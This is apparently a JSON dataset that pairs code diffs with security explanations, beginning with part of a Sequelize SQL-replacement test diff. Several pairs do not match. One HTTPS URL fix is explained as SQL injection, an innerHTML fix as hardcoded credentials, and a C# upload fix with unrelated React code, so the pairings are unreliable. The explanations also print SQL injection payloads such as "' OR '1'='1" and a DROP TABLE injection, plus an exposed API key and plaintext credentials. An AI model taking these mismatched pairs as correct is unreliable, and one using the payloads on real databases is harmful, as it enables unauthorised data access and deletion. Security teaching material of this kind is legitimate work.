afterEach(() => {\n+    sinon.restore();\n+  });\n+\n+  // you'll find more replacement tests in query-generator tests\n+  it('does not parse user-provided data as replacements', async () => {\n+    const getSql = stubQueryRun();\n+\n+    await sequelize.getQueryInterface().rawSelect(User.tableName, {\n+      // @ts-expect-error -- we'll fix the typings when we migrate query-generator to TypeScript\n+      attributes: ['id'],\n+      where: {\n+        username: 'some :data'\n+      },\n+      replacements: {\n+        data: 'OR \\' = '\n+      }\n+    }, 'id', User);\n+\n+    expectsql(getSql(), {\n+      default: 'SELECT [id] FROM [Users] AS [User] WHERE [User].[username] = \\'some :data\\';',\n+      mssql: 'SELECT [id] FROM [Users] AS [User] WHERE [User].[username] = N\\'some :data\\';'\n+    });\n+  });\n+});\ndiff --git a/test/unit/query-interface/select.test.js b/test/unit/query-interface/select.test.js\nnew file mode 100644\nindex 000000000000..4e04109a3cf9\n--- /dev/null\n+++ b/test/unit/query-interface/select.test.js\n@@ -0,0 +1,35 @@\n+const { DataTypes } = require('sequelize');\n+const sinon = require('sinon');\n+const { expectsql, sequelize } = require('../../support');\n+const { stubQueryRun } = require('./stub-query-run');\n+\n+describe('QueryInterface#select', () => {\n+  const User = sequelize.define('User', {\n+    firstName: DataTypes.STRING\n+  }, { timestamps: false });\n+\n+  afterEach(() => {\n+    sinon.restore();\n+  });\n+\n+  // you'll find more replacement tests in query-generator tests\n+  it('does not parse user-provided data as replacements', async () => {\n+    const getSql = stubQueryRun();\n+\n+    await sequelize.getQueryInterface().select(User, User.tableName, {\n+      // @ts-expect-error -- we'll fix the typings when we migrate query-generator to TypeScript\n+      attributes: ['id'],\n+      where: {\n+        username: 'some :data'\n+      },\n+      replacements: {\n+        data: 'OR \\' = '\n+      }\n+    });\n+\n+    expectsql(getSql(), {\n+      default: 'SELECT [id] FROM [Users] AS [User] WHERE [User].[username] = \\'some :data\\';',\n+      mssql: 'SELECT [id] FROM [Users] AS [User] WHERE [User].[username] = N\\'some :data\\';'\n+    });\n+  });\n+});\ndiff --git a/test/unit/query-interface/stub-query-run.js b/test/unit/query-interface/stub-query-run.js\nnew file mode 100644\nindex 000000000000..faa36779fbd9\n--- /dev/null\n+++ b/test/unit/query-interface/stub-query-run.js\n@@ -0,0 +1,22 @@\n+const sinon = require('sinon');\n+const { sequelize } = require('../../support');\n+\n+module.exports.stubQueryRun = function stubQueryRun() {\n+  let lastExecutedSql;\n+\n+  class FakeQuery {\n+    run(sql) {\n+      lastExecutedSql = sql;\n+\n+      return [];\n+    }\n+  }\n+\n+  sinon.stub(sequelize.dialect, 'Query').get(() => FakeQuery);\n+  sinon.stub(sequelize.connectionManager, 'getConnection').returns({});\n+  sinon.stub(sequelize.connectionManager, 'releaseConnection');\n+\n+  return () => {\n+    return lastExecutedSql;\n+  };\n+};\ndiff --git a/test/unit/sequelize.test.d.ts b/test/unit/sequelize.test.d.ts\nnew file mode 100644\nindex 000000000000..cb0ff5c3b541\n--- /dev/null\n+++ b/test/unit/sequelize.test.d.ts\n@@ -0,0 +1 @@\n+export {};\ndiff --git a/test/unit/utils/sql.test.js b/test/unit/utils/sql.test.js\nnew file mode 100644\nindex 000000000000..eea503679cd6\n--- /dev/null\n+++ b/test/unit/utils/sql.test.js\n@@ -0,0 +1,327 @@\n+const { injectReplacements } = require('sequelize/lib/utils/sql');\n+const { expect } = require('chai');\n+const { expectsql, sequelize } = require('../../support');\n+\n+const dialect = sequelize.dialect;\n+\n+describe('injectReplacements (named replacements)', () => {\n+  it('parses named replacements', () => {\n+    const sql = injectReplacements(`SELECT ${dialect.TICK_CHAR_LEFT}:id${dialect.TICK_CHAR_RIGHT} FROM users WHERE id = ':id' OR id = :id OR id = ''':id'''`, dialect, {\n+      id: 1\n+    });\n+\n+    expectsql(sql, {\n+      default: 'SELECT [:id] FROM users WHERE id = \\':id\\' OR id = 1 OR id = \\'\\'\\':id\\'\\'\\''\n+    });\n+  });\n+\n+  it('throws if a named replacement is not provided as an own property', () => {\n+    expect(() => {\n+      injectReplacements('SELECT * FROM users WHERE id = :toString', dialect, {\n+        id: 1\n+      });\n+    }).to.throw('Named replacement \":toString\" has no entry in the replacement map.');\n+\n+  });\n+\n+  it('parses named replacements followed by cast syntax', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = :id::string', dialect, {\n+      id: 1\n+    });\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = 1::string'\n+    });\n+  });\n+\n+  it('parses single letter named replacements', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = :a', dialect, {\n+      a: 1\n+    });\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = 1'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it does not follow \\'(\\', \\',\\', \\'=\\' or whitespace', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = fn(:id) OR id = fn(\\'a\\',:id) OR id=:id OR id = :id', dialect, {\n+      id: 1\n+    });\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = fn(1) OR id = fn(\\'a\\',1) OR id=1 OR id = 1'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is part of a $ quoted string', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = $tag$ :id $tag$ OR id = $$ :id $$', dialect, {\n+      id: 1\n+    });\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = $tag$ :id $tag$ OR id = $$ :id $$'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is part of a nested $ quoted string', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = $tag1$ $tag2$ :id $tag2$ $tag1$', dialect, {\n+      id: 1\n+    });\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = $tag1$ $tag2$ :id $tag2$ $tag1$'\n+    });\n+  });\n+\n+  it('does consider the token to be a replacement if it is in between two identifiers that look like $ quoted strings', () => {\n+    const sql = injectReplacements('SELECT z$$ :id x$$ * FROM users', dialect, {\n+      id: 1\n+    });\n+\n+    expectsql(sql, {\n+      default: 'SELECT z$$ 1 x$$ * FROM users'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is part of a string with a backslash escaped quote', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = \\'\\\\\\':id\\' OR id = :id', dialect, {\n+      id: 1\n+    });\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = \\'\\\\\\':id\\' OR id = 1'\n+    });\n+  });\n+\n+  it('considers the token to be a replacement if it is outside a string ending with an escaped backslash', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = \\'\\\\\\\\\\' OR id = :id', dialect, {\n+      id: 1\n+    });\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = \\'\\\\\\\\\\' OR id = 1'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is part of a string with an escaped backslash followed by a backslash escaped quote', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = \\'\\\\\\\\\\\\\\':id\\' OR id = :id', dialect, {\n+      id: 1\n+    });\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = \\'\\\\\\\\\\\\\\':id\\' OR id = 1'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is in a single line comment', () => {\n+    const sql = injectReplacements(`\n+      SELECT * FROM users -- WHERE id = :id\n+      WHERE id = :id\n+    `, dialect, { id: 1 });\n+\n+    expectsql(sql, {\n+      default: `\n+        SELECT * FROM users -- WHERE id = :id\n+        WHERE id = 1\n+      `\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is in string but a previous comment included a string delimiter', () => {\n+    const sql = injectReplacements(`\n+      SELECT * FROM users -- '\n+      WHERE id = ' :id '\n+    `, dialect, { id: 1 });\n+\n+    expectsql(sql, {\n+      default: `\n+        SELECT * FROM users -- '\n+        WHERE id = ' :id '\n+      `\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is in a single line comment', () => {\n+    const sql = injectReplacements(`\n+      SELECT * FROM users /*\n+      WHERE id = :id\n+      */\n+      WHERE id = :id\n+    `, dialect, { id: 1 });\n+\n+    expectsql(sql, {\n+      default: `\n+        SELECT * FROM users /*\n+        WHERE id = :id\n+        */\n+        WHERE id = 1\n+      `\n+    });\n+  });\n+\n+  it('does not interpret ::x as a replacement, as it is a cast', () => {\n+    expect(injectReplacements('(\\'foo\\')::string', dialect, [0])).to.equal('(\\'foo\\')::string');\n+  });\n+});\n+\n+describe('injectReplacements (positional replacements)', () => {\n+  it('parses positional replacements', () => {\n+    const sql = injectReplacements(`SELECT ${dialect.TICK_CHAR_LEFT}?${dialect.TICK_CHAR_RIGHT} FROM users WHERE id = '?' OR id = ? OR id = '''?''' OR id2 = ?`, dialect, [1, 2]);\n+\n+    expectsql(sql, {\n+      default: 'SELECT [?] FROM users WHERE id = \\'?\\' OR id = 1 OR id = \\'\\'\\'?\\'\\'\\' OR id2 = 2'\n+    });\n+  });\n+\n+  it('parses positional replacements followed by cast syntax', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = ?::string', dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = 1::string'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it does not follow \\'(\\', \\',\\', \\'=\\' or whitespace', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = fn(?) OR id = fn(\\'a\\',?) OR id=? OR id = ?', dialect, [2, 1, 3, 4]);\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = fn(2) OR id = fn(\\'a\\',1) OR id=3 OR id = 4'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is part of a $ quoted string', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = $tag$ ? $tag$ OR id = $$ ? $$', dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = $tag$ ? $tag$ OR id = $$ ? $$'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is part of a nested $ quoted string', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = $tag1$ $tag2$ ? $tag2$ $tag1$', dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = $tag1$ $tag2$ ? $tag2$ $tag1$'\n+    });\n+  });\n+\n+  it('does consider the token to be a replacement if it is in between two identifiers that look like $ quoted strings', () => {\n+    const sql = injectReplacements('SELECT z$$ ? x$$ * FROM users', dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: 'SELECT z$$ 1 x$$ * FROM users'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is part of a string with a backslash escaped quote', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = \\'\\\\\\'?\\' OR id = ?', dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = \\'\\\\\\'?\\' OR id = 1'\n+    });\n+  });\n+\n+  it('considers the token to be a replacement if it is outside a string ending with an escaped backslash', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = \\'\\\\\\\\\\' OR id = ?', dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = \\'\\\\\\\\\\' OR id = 1'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is part of a string with an escaped backslash followed by a backslash escaped quote', () => {\n+    const sql = injectReplacements('SELECT * FROM users WHERE id = \\'\\\\\\\\\\\\\\'?\\' OR id = ?', dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM users WHERE id = \\'\\\\\\\\\\\\\\'?\\' OR id = 1'\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is in a single line comment', () => {\n+    const sql = injectReplacements(`\n+      SELECT * FROM users -- WHERE id = ?\n+      WHERE id = ?\n+    `, dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: `\n+        SELECT * FROM users -- WHERE id = ?\n+        WHERE id = 1\n+      `\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is in string but a previous comment included a string delimiter', () => {\n+    const sql = injectReplacements(`\n+      SELECT * FROM users -- '\n+      WHERE id = ' ? '\n+    `, dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: `\n+        SELECT * FROM users -- '\n+        WHERE id = ' ? '\n+      `\n+    });\n+  });\n+\n+  it('does not consider the token to be a replacement if it is in a single line comment', () => {\n+    const sql = injectReplacements(`\n+      SELECT * FROM users /*\n+      WHERE id = ?\n+      */\n+      WHERE id = ?\n+    `, dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: `\n+        SELECT * FROM users /*\n+        WHERE id = ?\n+        */\n+        WHERE id = 1\n+      `\n+    });\n+  });\n+\n+  // https://github.com/sequelize/sequelize/issues/14358\n+  it('does not parse ?& and ?| operators as replacements (#14358)', async () => {\n+    const sql = injectReplacements('SELECT * FROM products WHERE tags ?& ARRAY[1] AND tags ?| ARRAY[1] AND id = ?;', dialect, [1]);\n+\n+    expectsql(sql, {\n+      default: 'SELECT * FROM products WHERE tags ?& ARRAY[1] AND tags ?| ARRAY[1] AND id = 1;',\n+      // 'default' removes the trailing ; for ibmi, but we actually need to test it's there this time, to ensure '?;' is treated as a replacement + ';'\n+      ibmi: 'SELECT * FROM products WHERE tags ?& ARRAY[1] AND tags ?| ARRAY[1] AND id = 1;'\n+    });\n+  });\n+\n+  it('formats where clause correctly when the value is falsy', () => {\n+    expect(injectReplacements('foo = ?', dialect, [0])).to.equal('foo = 0');\n+  });\n+\n+  it('formats arrays as an expression instead of an ARRAY data type', async () => {\n+    const sql = injectReplacements('INSERT INTO users (username, email, created_at, updated_at) VALUES ?;', dialect, [[\n+      ['john', 'john@gmail.com', '2012-01-01 10:10:10', '2012-01-01 10:10:10'],\n+      ['michael', 'michael@gmail.com', '2012-01-01 10:10:10', '2012-01-01 10:10:10']\n+    ]]);\n+\n+    expectsql(sql, {\n+      default: `\n+        INSERT INTO users (username, email, created_at, updated_at)\n+        VALUES\n+          ('john', 'john@gmail.com', '2012-01-01 10:10:10', '2012-01-01 10:10:10'),\n+          ('michael', 'michael@gmail.com', '2012-01-01 10:10:10', '2012-01-01 10:10:10');`,\n+      // 'default' removes the trailing ; for ibmi, but we actually need to test it's there this time, to ensure '?;' is treated as a replacement + ';'\n+      ibmi: `\n+        INSERT INTO users (username, email, created_at, updated_at)\n+        VALUES\n+          ('john', 'john@gmail.com', '2012-01-01 10:10:10', '2012-01-01 10:10:10'),\n+          ('michael', 'michael@gmail.com', '2012-01-01 10:10:10', '2012-01-01 10:10:10');`,\n+      mssql: `\n+        INSERT INTO users (username, email, created_at, updated_at)\n+        VALUES\n+          (N'john', N'john@gmail.com', N'2012-01-01 10:10:10', N'2012-01-01 10:10:10'),\n+          (N'michael', N'michael@gmail.com', N'2012-01-01 10:10:10', N'2012-01-01 10:10:10');`\n+    });\n+  });\n+});\ndiff --git a/yarn.lock b/yarn.lock\nindex 7ec00d439fcd..514efe1607bd 100644\n--- a/yarn.lock\n+++ b/yarn.lock\n@@ -990,6 +990,11 @@\n   resolved \"https://registry.yarnpkg.com/@types/json-schema/-/json-schema-7.0.9.tgz#97edc9037ea0c38585320b28964dde3b39e4660d\"\n   integrity sha512-qcUXuemtEu+E5wZSJHNxUXeCZhAfXKQ41D+duX+VYPde7xyEVZci+/oXKJL13tnRs9lR2pr4fod59GT6/X1/yQ==\n \n+\"@types/lodash@4.14.182\":\n+  version \"4.14.182\"\n+  resolved \"https://registry.yarnpkg.com/@types/lodash/-/lodash-4.14.182.tgz#05301a4d5e62963227eaafe0ce04dd77c54ea5c2\"\n+  integrity sha512-/THyiqyQAP9AfARo4pF+aCGcyiQ94tX/Is2I7HofNRqoYLgN1PBoOWu2/zTA5zMxzP5EFutMtWtGAFRKUe961Q==\n+\n \"@types/minimist@^1.2.0\":\n   version \"1.2.2\"\n   resolved \"https://registry.yarnpkg.com/@types/minimist/-/minimist-1.2.2.tgz#ee771e2ba4b3dc5b372935d549fd9617bf345b8c\"\n",
        "explanation": "Vulnerability Type:\nCWE-522: Insufficiently Protected Credentials\nCWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n(related to hardcoded API keys and lack of validation)\n\n Proof of Concept:\n\nconst API_KEY = \"407327cef93c632e2549e6440178f6a7\";\nThis API key is embedded directly in the frontend, making it accessible to anyone using browser dev tools.\n\nNo sanitization is performed on the city input before passing it to the URL, e.g.:\n\n`${API_URL}?q=${city}&appid=${API_KEY}&units=metric`\n Severity:\nHigh (Critical if API has billing/quota limits)\n\n Root Cause:\nThe API key is exposed in client-side code and no input validation is performed on user-provided city names. This allows anyone to extract the key and make arbitrary API calls, possibly exhausting your quota or causing unexpected API errors.\n\n Exploit Scenario:\nAn attacker inspects the page source or uses browser dev tools to grab the API key. They write a script that floods the OpenWeatherMap API with automated requests using that key, eventually exhausting the API quota, causing outages, or triggering rate limits. They could also input garbage values or script injections to break the frontend.\n\n Why It Happens:\nThe design assumes the API key can be safely used in frontend code and that user input to the weather endpoint is always valid. No server-side proxy is used to protect the key or mediate access, and no checks sanitize or validate the city input.\n\n Security Implications:\nAPI abuse or quota exhaustion\n\nIncreased cloud billing costs if on a paid plan\n\nService denial to real users due to exhausted API limits\n\nCrashes or broken UI from malformed API responses\n\nPotential phishing or abuse of API key on other apps\n\n Suggested Fix:\n Move the API_KEY to a backend server or use a serverless proxy that hides the key.\n\n If keeping client-side, store in .env and reference it using process.env.REACT_APP_WEATHER_API_KEY, then set up restrictions on the key in the OpenWeatherMap console (e.g., domain lock).\n\n Add input sanitization to trim and reject invalid city names:\n\nconst sanitized = city.trim();\nif (!/^[a-zA-Z\\s]{2,50}$/.test(sanitized)) throw new Error(\"Invalid city\");"
    },
    "153": {
        "diff": "--- a/scraper.py\n+++ b/scraper.py\n@@\n-# Amazon URL\n-URL = 'http://www.amazon.com/dp/'\n+# Amazon URL (secure HTTPS)\n+URL = 'https://www.amazon.com/dp/'\n",
        "explanation": "Explanation:\nThe code frequently uses Python f-strings or string concatenation to build SQL queries by directly embedding user-controlled input variables. This practice exposes the application to SQL Injection attacks, where an attacker can manipulate the input to execute arbitrary SQL commands.\n\n\nPOC:\nIf an attacker inputs a malicious string such as \"' OR '1'='1\" in any field used directly in SQL queries, they could retrieve unauthorized data or corrupt the database.\n\nself.Customer_Contact_No_var.set(\"12345 OR 1=1 --\")\nmy_cursor.execute(f\"SELECT Customer_ID, * FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n\nThis would translate to:\n\nSELECT Customer_ID, * FROM customer WHERE Contact_No = 12345 OR 1=1 -- \nwhich returns all rows.\n\n\nRoot Cause: File rooms_booking.py\n\nLine ~161 (fetch_contact function):\nmy_cursor.execute(f\"SELECT Customer_ID, * FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n\nLine ~292 (delete_data function):\nmy_cursor.execute(f\"DELETE FROM room_booking WHERE Booking_ID = {self.Customer_Booking_ID_var.get()}\")\n\nLine ~415 (search function):\nmy_cursor.execute(f\"SELECT * FROM room_booking WHERE {self.search_by_table_var.get()} = '{self.search_by_attribute_var.get()}'\")\n\nLine ~485 (booked_room_no function):\nmy_cursor.execute(f\"\"\"UPDATE room_types SET Availability = 'No' WHERE Room_No = {self.Allotted_room_var.get()}\"\"\")\n\n\nExploit Scenario:\nAn attacker inputs specially crafted strings into input fields such as Contact_No, Booking_ID, or search attributes. This input manipulates the SQL query structure, allowing the attacker to bypass authentication, retrieve unauthorized data, delete or modify data, or cause denial of service.\n\n\n\nWhy it Happens:\nBecause user inputs are directly embedded into SQL queries without sanitization or parameterization, the database engine interprets injected SQL commands.\n\n\nSecurity Implications:\nData leakage or unauthorized data access.\nData corruption or deletion.\nPotential full compromise of the database.\nLoss of data integrity and availability.\n\n\nSuggested Fix:\nUse parameterized queries with placeholders (? or named parameters) instead of string interpolation.\n\n\nPatch fix for fetch_contact function (line ~161):\nmy_cursor.execute(\"SELECT Customer_ID, * FROM customer WHERE Contact_No = ?\", (self.Customer_Contact_No_var.get(),))\nSimilarly, fix other queries:\n\n\nPatch Fix for delete_data (line ~292):\nmy_cursor.execute(\"DELETE FROM room_booking WHERE Booking_ID = ?\", (self.Customer_Booking_ID_var.get(),))\n\n\nPatch Fix for search (line ~415), dynamic column names cannot be parameterized directly. Validate self.search_by_table_var.get() against a whitelist of allowed column names before using it in the query, and parameterize the value:\n\nallowed_columns = [\"Name\", \"Check_In\", \"Check_Out\", \"Room_Type\", \"Allotted_Room\", \"Meal\"]\ncolumn = self.search_by_table_var.get()\nif column not in allowed_columns:\n    raise ValueError(\"Invalid search column\")\nmy_cursor.execute(f\"SELECT * FROM room_booking WHERE {column} = ?\", (self.search_by_attribute_var.get(),))\n\n\nPatch fix for booked_room_no (line ~485):\nmy_cursor.execute(\"UPDATE room_types SET Availability = 'No' WHERE Room_No = ?\", (self.Allotted_room_var.get(),))"
    },
    "154": {
        "diff": "--- vulnerable.js\n+++ secure.js\n@@\n-    cell1.innerHTML = data.id;\n-    cell2.innerHTML = data.value;\n-    cell3.innerHTML = data.timestamp;\n+    cell1.textContent = data.id;\n+    cell2.textContent = data.value;\n+    cell3.textContent = data.timestamp;\n",
        "explanation": "Explanation: \nUsername and password are hardcoded in the source code (lines 10-11).\n\n\nPOC:\nusername = \"root\"  # Line 10\npassword = \"password\"  # Line 11\n\n\nRoot Cause:  File hotelamanagement.py\nCredentials stored in plaintext within the codebase.\n\n\nExploit Scenario: \nAttackers with access to the source code (e.g., via repository leaks or shared environments) gain full database access.\n\n\nWhy it Happens: \nLack of secrets management practices.\n\n\nSecurity Implications: \nUnauthorized data access, privilege escalation, and data exfiltration.\n\n\nSuggested Fix:\n\n# Use environment variables or a secrets manager\nimport os\nusername = os.getenv(\"DB_USER\")\npassword = os.getenv(\"DB_PASSWORD\")"
    },
    "100": {
        "diff": "diff --git a/EPatient/Views/Staff/ReservationDiagnose.cs b/EPatient/Views/Staff/ReservationDiagnose.cs\nindex abcdef1..1234567 100644\n--- a/EPatient/Views/Staff/ReservationDiagnose.cs\n+++ b/EPatient/Views/Staff/ReservationDiagnose.cs\n@@ private void btnUpload_Click(object sender, EventArgs e)\n-        private void btnUpload_Click(object sender, EventArgs e)\n-        {\n-            using (OpenFileDialog ofd = new OpenFileDialog(){Multiselect = false, ValidateNames = true})\n-            {\n-                if (ofd.ShowDialog() == DialogResult.OK)\n-                {\n-                    var filePath = ofd.FileName;\n-                    FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read);\n-                    int intLength = Convert.ToInt32(stream.Length);\n-                    byte[] file = new byte[intLength];\n-                    stream.Read(file, 0, intLength);\n-                    stream.Close();\n-                    FileUploaded.FileBytes = file;\n-                    string[] strPath = filePath.Split(Convert.ToChar(@\"\\\"));\n-                    FileUploaded.FileName = strPath[strPath.Length - 1];\n-                    btnUpload.Enabled = false;\n-                }\n-            }\n-        }\n+        private void btnUpload_Click(object sender, EventArgs e)\n+        {\n+            using (OpenFileDialog ofd = new OpenFileDialog() { Multiselect = false, ValidateNames = true })\n+            {\n+                if (ofd.ShowDialog() == DialogResult.OK)\n+                {\n+                    var filePath = ofd.FileName;\n+                    var allowedExtensions = new string[] { \".pdf\", \".docx\", \".png\", \".jpg\", \".jpeg\" };\n+                    var extension = Path.GetExtension(filePath).ToLower();\n+\n+                    if (!allowedExtensions.Contains(extension))\n+                    {\n+                        MessageBox.Show(\"Unsupported file type. Please upload a valid document or image.\");\n+                        return;\n+                    }\n+\n+                    using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))\n+                    {\n+                        byte[] file = new byte[stream.Length];\n+                        stream.Read(file, 0, file.Length);\n+                        FileUploaded.FileBytes = file;\n+                    }\n+                    FileUploaded.FileName = Path.GetFileName(filePath);\n+                    btnUpload.Enabled = false;\n+                }\n+            }\n+        }\n",
        "explanation": "Vulnerability Type:\nCWE-434: Unrestricted Upload of File with Dangerous Type\n\nThe application allows uploading files without verifying their actual type.\n\nProof of Concept:\nVulnerable Code:\n\n<input\n  type=\"file\"\n  accept=\"image/*\"\n  onChange={handleFileChange}\n/>\nExplanation:\n\nThe application only checks if the file input accepts image/* through the browser hint.\n\nIt does not verify the real file type (MIME type) or check the file content (\"magic bytes\").\n\nA malicious file (e.g., .php or .exe) renamed as .jpg can be uploaded successfully.\n\nSteps:\n\nCreate a text file and save it as malicious.jpg.\n\nUpload it using the upload field.\n\nThe application accepts it without verifying if it's really an image.\n\nSeverity:\nHigh\n(If combined with server misconfiguration, can lead to remote code execution.)\n\nRoot Cause:\nThe vulnerability arises because the code trusts the file extension and client-side MIME type hints without server-side or actual file content validation. This allows malicious non-image files to be uploaded undetected.\n\nExploit Scenario:\nAn attacker can upload a fake .jpg file containing malicious code (like a PHP webshell or a JavaScript payload). If the backend stores and executes it, the attacker can gain full server control, access sensitive files, or deface the website.\n\nWhy It Happens:\nThe application assumes that files selected by the user are safe if their extension or MIME type matches expected types (e.g., image/jpeg). However, file extensions and Content-Type headers can be spoofed easily by attackers, and without deep inspection, the system trusts unsafe files.\n\nSecurity Implications:\nIf exploited, the attacker can:\n\nUpload executable malware.\n\nPerform remote code execution.\n\nSteal sensitive data from the server.\n\nDeface or destroy application content.\n\nUse the server as a pivot point to attack internal networks.\n\nThis can lead to complete compromise of the web application and infrastructure.\n\nSuggested Fix:\nValidate file types strictly on the server side, not just client-side.\n\nVerify the file's magic numbers to confirm it matches expected file types (e.g., JPEG starts with FFD8).\n\nRestrict accepted file types to a whitelist.\n\nReject or quarantine suspicious files immediately.\n\nSet safe permissions and scan uploads using malware scanners if necessary.\n\nExample frontend validation:\n\n\nconst allowedTypes = ['image/jpeg', 'image/png'];\nif (!allowedTypes.includes(file.type)) {\n  alert('Invalid file type. Only JPEG or PNG allowed.');\n}\nExample backend validation:\n\n# Python (Django) example\nif not uploaded_file.content_type.startswith('image/'):\n    return HttpResponseForbidden(\"Invalid file type.\")"
    },
    "107": {
        "diff": "diff --git a/main.py b/main.py\n--- a/main.py\n+++ b/main.py\n@@ -[LINE_NUMBER]X,Y +[LINE_NUMBER]X,Y @@\n     def returnbooks(self):\n         class returning(main):\n             def returned(self):\n                 ...\n                 def return_record():\n                     selected = self.all_books_tree_return.focus()\n                     stored_id = str(self.all_books_tree_return.item(selected).get('values')[0])\n+                    # Input validation: Ensure `stored_id` is numeric\n+                    if not stored_id.isdigit():\n+                        messagebox.show_error(\"Invalid ascension number\", 'LBSHS LMS')\n+                        return\n+                    # Parameterized query to prevent SQL injection\n-                    cursor.execute(\"DELETE from issues where oid=\" + stored_id)\n+                    cursor.execute(\"DELETE FROM issues WHERE oid=?\", (stored_id,))\n                     db.commit()",
        "explanation": "Vulnerability Type:\nCWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n\nProof of Concept:\nHere is the vulnerable code in question:\n\nconst userExist = (username, cb) => query.select(`SELECT count(id) from users where username = '${username}'`, cb);\nStep-by-step Explanation:\nIn this case, the query directly embeds user input (username) into the SQL string without sanitizing it. An attacker could exploit this by submitting the following malicious input as the username:\n\n\"rahul\"; DROP TABLE users; --\"\nThis will modify the SQL query as follows:\n\nSELECT count(id) from users where username = 'rahul'; DROP TABLE users; --';\nWhat happens here:\n\nThe first part of the query (SELECT count(id) from users where username = 'rahul';) will execute normally and return the result for the username \"rahul\".\n\nThe second part (DROP TABLE users;) is injected into the query. This SQL statement is executed after the first part and will attempt to drop (delete) the entire users table from the database.\n\nThe -- marks the rest of the query as a comment, effectively ignoring any subsequent SQL code, which prevents errors from the rest of the original query.\n\nAs a result, the attacker not only bypasses the logic intended to check if the user exists but also deletes the entire users table, leading to a catastrophic loss of data.\n\nSeverity:Critical\n\n\nRoot Cause:\nThe root cause of this vulnerability is the direct inclusion of user input into SQL queries without proper validation or sanitization. By concatenating the username directly into the query string, the application allows malicious users to inject arbitrary SQL commands. The lack of proper input sanitization or the use of parameterized queries results in the system treating the user input as part of the SQL statement, which attackers can manipulate for harmful purposes. This flaw is common in applications that dynamically generate SQL queries based on user input.\n\nExploit Scenario:\nIn this scenario, an attacker submits the following username as input:\n\n\"rahul\"; DROP TABLE users; --\"\nThis input alters the query, causing the following sequence of events:\n\nThe first part of the query will check if the username \"rahul\" exists, which could return a valid result.\n\nThe second part of the injected input, DROP TABLE users;, will execute after the initial query and will delete the users table from the database.\n\nThe -- comment syntax ensures that the rest of the query (if any) is ignored, preventing errors or unintended consequences in the query's execution.\n\nThis could allow the attacker to cause significant damage to the database, such as deleting user data or completely wiping important tables, leading to a major disruption of service.\n\nWhy It Happens:\nThis vulnerability occurs because the application constructs SQL queries by directly embedding user input into the query string, without validating or sanitizing the input. SQL queries need to treat user input as data rather than executable code to prevent an attacker from altering the query\u2019s logic. The failure to separate user input from SQL statements and the reliance on manual concatenation rather than using parameterized queries is what enables the attacker to inject arbitrary SQL commands and exploit the vulnerability.\n\nSecurity Implications:\nThe exploitation of this vulnerability can lead to severe security consequences. An attacker can manipulate the SQL query to execute malicious commands, such as:\n\nDropping tables (DROP TABLE), resulting in loss of data and potentially a critical part of the application\u2019s functionality.\n\nReading sensitive data (e.g., passwords, emails, personal information) by altering the query to retrieve data from other tables.\n\nModifying or deleting records from the database, leading to data corruption, unauthorized access, or even the complete destruction of the database.\n\nEscalating privileges to gain full administrative access, depending on the database configuration and permissions.\n\nIn a worst-case scenario, the attacker could gain full control over the database, compromising the integrity of the application and its data.\n\nSuggested Fix:\nTo resolve this issue, the code should use parameterized queries or prepared statements to ensure that user input is treated as data, not part of the query. This method separates the SQL code from the data and prevents any user input from being executed as part of the SQL statement. 